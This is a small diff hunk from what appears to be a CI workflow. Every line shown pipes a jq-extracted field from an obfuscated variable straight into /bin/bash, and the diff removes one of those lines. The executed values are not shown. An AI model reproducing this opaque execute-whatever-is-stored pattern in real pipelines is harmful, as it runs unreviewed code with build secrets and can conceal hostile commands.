@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$c65" | jq -r .mt59 | /bin/bash
           echo $u47442 | jq -r .zvmod9 | /bin/bash
           echo $ln7910 | jq -r .cxae48970 | /bin/bash
-          echo $cvt24902 | jq -r .vewd0 | /bin/bash
           printf '%s' "$njj3" | jq -r .taai9 | /bin/bash
           printf '%s' "$li04" | jq -r .mx2881 | /bin/bash
           echo $tp5129 | jq -r .mx8 | /bin/bash
